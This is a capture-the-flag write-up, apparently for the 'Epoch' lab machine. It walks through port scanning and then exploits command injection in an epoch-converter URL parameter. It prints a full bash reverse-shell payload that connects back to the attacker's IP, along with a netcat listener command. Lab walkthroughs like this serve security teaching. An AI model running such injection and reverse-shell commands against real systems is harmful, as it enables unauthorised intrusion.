**Target: 10.10.19.222 	Epoch**

**Initial Access:**\
nmap -Pn  10.10.19.222  --min-rate=5000 -p-\
Output from nmap shows open ports 22,80

Enumerating open ports further with nmap:\
nmap -Pn 10.10.19.222  --min-rate=5000 -p 22,80 -sC -sV -oN nmap.epoch

![image](https://user-images.githubusercontent.com/93153300/198738065-a99e4244-85de-43b5-9bd4-e1f6ffc950d4.png)
 
Navigating to port 80 shows:

![image](https://user-images.githubusercontent.com/93153300/198738126-f1258038-61f3-4d1d-a76c-76cfa34f777e.png)
 
Let’s test the converter.  Put a random word in:

![image](https://user-images.githubusercontent.com/93153300/198738176-59b4db1d-70e0-473a-b704-a3aced5d3dd7.png)
 
We see in the url that we are taken to a directory /?epoch=

Testing for command injection let’s try:   blob;id;
Found command injection, the command 'id' ran:

![image](https://user-images.githubusercontent.com/93153300/198738230-92e20d5b-4882-4560-9602-01fbfe92a571.png)
 
Let’s use this to get a reverse shell.  First, open a netcat listener: nc -lvnp 443 (I will use pwncat: pwncat-cs -lp 443).  Next, replace blob;id with: blob;bash -c 'bash -i >& /dev/tcp/10.2.1.148/443 0>&1'\
We got shell as challenge:

![image](https://user-images.githubusercontent.com/93153300/198738276-4a3062e7-51c9-466a-8fec-41b536fc5314.png)
_____________________________________________________________
Upon checking environment variables we find the flag:

![image](https://user-images.githubusercontent.com/93153300/198738301-c47df8d5-9797-453f-82ff-b3984c3b6021.png)
 

This machine only had one flag, and was not made for privilege escalation to get root. So our work here is done.
